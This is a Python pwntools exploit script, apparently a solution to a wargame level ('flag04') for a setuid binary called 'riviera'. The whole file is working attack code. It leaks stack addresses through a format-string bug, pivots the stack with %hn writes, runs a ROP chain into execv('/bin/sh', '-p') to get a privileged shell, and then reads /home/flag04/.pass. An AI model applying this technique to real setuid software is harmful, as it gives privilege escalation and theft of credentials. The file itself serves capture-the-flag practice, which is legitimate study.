#!/usr/bin/env python3
import re
import sys
from pwn import *

BINARY = "./riviera"
context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.log_level = "error"

LIBC = 0x7FFFF7C00000
POP_RDI = LIBC + 0x10C08D
POP_RSI = LIBC + 0x110B7D
EXECV = LIBC + 0xEF010
LEAVE_RET = 0x401444
MSG_OFFSET = 0x120

io = process(BINARY)
io.sendafter(b"Tag: ", b"%8$p %46$p %10$p\n")
io.sendafter(b"Message: ", p64(0xdeadbeefcafebabe) + b"\n")
out = io.recvall(timeout=2).decode(errors="replace")
io.close()

vals = re.findall(r"tag=(0x[0-9a-f]+) (0x[0-9a-f]+) (0x[0-9a-f]+)", out)
if not vals:
    print("[-] leak failed:\n" + out)
    sys.exit(1)
rbp_handle, main_rbp, marker = (int(v, 16) for v in vals[0])
if marker != 0xdeadbeefcafebabe:
    print("[-] frame layout mismatch: %#x" % marker)
    sys.exit(1)

msg_addr = rbp_handle - MSG_OFFSET
fake_rbp = msg_addr + 8
binsh = msg_addr + 8 * 12
dashp = msg_addr + 8 * 14
argv = msg_addr + 8 * 9
W1 = fake_rbp & 0xFFFF
W2 = LEAVE_RET & 0xFFFF
if W1 <= W2 or (fake_rbp >> 16) != (main_rbp >> 16):
    print("[-] bad stack layout: W1=%#x W2=%#x" % (W1, W2))
    sys.exit(1)

tag = ("%1$" + str(W2) + "c%11$hn%1$" + str(W1 - W2) + "c%10$hn").encode()
assert len(tag) <= 31

msg = flat(
    rbp_handle,
    rbp_handle + 8,
    POP_RDI, binsh,
    POP_RSI, argv,
    EXECV,
    0, 0,
    binsh, dashp, 0,
    b"/bin/sh\x00",
    0,
    b"-p\x00\x00\x00\x00\x00\x00",
    0,
)
assert b"\x0a" not in msg

io = process(BINARY)
io.sendafter(b"Tag: ", tag + b"\n")
io.sendafter(b"Message: ", msg + b"\n")
io.sendline(b"id")
io.sendline(b"cat /home/flag04/.pass")
out = io.recvall(timeout=5).decode(errors="replace")
print(out[-400:], flush=True)

if "flag04" in out:
    print("[+] flag04, password printed above", flush=True)
else:
    print("[-] failed, see output above", flush=True)
